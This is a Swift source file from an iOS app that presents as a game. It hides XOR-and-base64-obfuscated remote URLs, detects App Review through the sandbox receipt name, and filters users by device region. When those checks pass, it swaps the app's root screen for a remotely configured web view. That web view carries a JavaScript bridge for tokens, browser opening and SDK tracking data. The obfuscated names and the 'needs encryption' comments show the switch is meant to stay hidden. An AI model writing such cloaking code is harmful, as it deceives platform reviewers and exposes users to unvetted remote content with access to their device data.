
import Foundation
import UIKit
import AdjustSdk

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Ovnruud(_ input: String) -> String? {
    let k: UInt8 = 160
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json
//internal let kXiangwoUisdf = "zdHR1dafiorE1cyLyNyIzNWLzMqK05eKzNWLz9bKyw=="         //Ip ur

//https://699d429583e60a406a45a527.mockapi.io/egse/gaxlzys
internal let kOsnheydye = "yNTU0NOaj4+WmZnElJKZlZiTxZaQwZSQlsGUlcGVkpeOzc/Dy8HQyY7Jz4/Fx9PFj8fB2Mza2dM="        //https://68f19c3ab36f9750dee9bf80.mockapi.io/1yuu2/battleis

//5Pj4/P+2o6P+7fui6+X45Pnu+f/p/u/j4vjp4vii7+Pho+bo+ebto/z+4/+j4e3l4qPv4+L/oub86w==
internal let kOyeyr = "yNTU0NOaj4/SwdeOx8nUyNXC1dPF0sPPztTFztSOw8/Nj8rE1crBj8fBzMHY2Y/NwcnOj8fB2MzB2I7K0Mc="      //https://raw.githubusercontent.com/jduja/galaxy/main/gaxlax.jpg


/*--------------------启动加载------------------------*/
//internal func HuntOrderOimeas(_ vc: UIViewController) {
//    let _ = ArithmeticGameView(frame: .zero)
//}
//
//internal func HuntOrderYhdyuua(_ vc: UIViewController) {
////    let eptName = "MgQZBhIZARg7GRccHhME"    //MindCoirnhje
////    let fName = dpt(kMaxMinDoeiuaNhes)!
//    let fName = ""
//    
//    let fctn: [String: (UIViewController) -> Void] = [
//        fName: HuntOrderOimeas
//    ]
//    fctn[fName]?(vc)
//}

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Mjseaiso() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
        
        let nc = ws.windows.first!.rootViewController
        for view in nc!.view.subviews {
            if view.tag == 524 {
                view.removeFromSuperview()
                
                OrientationManager.lock(.landscape)
//                UINavigationController.attemptRotationToDeviceOrientation()
            }
        }
        
//        let nc = ws.windows.first!.rootViewController as! UINavigationController
//        for view in nc.topViewController!.view.subviews {
//            if view.tag == 524 {
//                view.removeFromSuperview()
//                
//                OrientationManager.lock(.landscape)
//                UINavigationController.attemptRotationToDeviceOrientation()
//            }
//        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func MnahsDusie() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Mjseaiso
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func FindKiee(_ dt: Foeishbh) {
    DispatchQueue.main.async {
        let vc = KandeiBajirmViewController()
        vc.mdalo = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func SmndjLosie(_ param: Foeishbh) {
    let fName = ""

    typealias rushBlitzIusj = (Foeishbh) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : FindKiee
    ]
    
    fctn[fName]?(param)
}

internal struct Foeishbh: Codable {
    let cdxdfoiw: String?         //key arr
    let bmeiuw: Float?         //key arr
    let fpowok: String?         //key arr

    let vunsje: [String]?         //key arr ["jsBridge", "update_token", "update_lang", "openAppBrowser", "getReportSdkData"]
//    let msoapi: [String]?    // app_token adid idfa
    let dfhuo: String?      //region 
    let cnaieuy: String?         // shi fou kaiqi
    let ksimeh: String?         // jum
    let nhauwk: String?          // backcolor
    let nsjies: String?
    let mcisnl: Int?          // too btn
//    let yixues: String?            // yeu nan xianzhi
    let zuiome: String?   //app_token
}




//func deviceModelIdentifier() -> String {
//    var systemInfo = utsname()
//    uname(&systemInfo)
//    return withUnsafePointer(to: &systemInfo.machine) {
//        $0.withMemoryRebound(to: CChar.self, capacity: 1) {
//            String(cString: $0)
//        }
//    }
//}

func AnsdnYiedr() -> Bool {
    guard let receiptURL = Bundle.main.appStoreReceiptURL else { return false }
     if (receiptURL.lastPathComponent.contains("boxRe")) {
         return false
     }
    
//    print(deviceModelIdentifier())
//    if deviceModelIdentifier().contains("iPa") {
//        return false
//    }
    
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if cdo.contains(rc) {
//            return false
//        }
//    }
    
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if (offset >= 0 && offset < 3) || (offset > -11 && offset < -4) {
//        return false
//    }
    
    return true
}

private let cdo = [Ovnruud("9fM="), Ovnruud("7uw=")]


func Gyaueiow() -> Bool {
    if let rc = Locale.current.regionCode {
//        print(rc)
        if cdo.contains(rc) {
            return false
        }
    }
    return true
}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UIDevice {
    var modelName: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        return identifier
    }
}
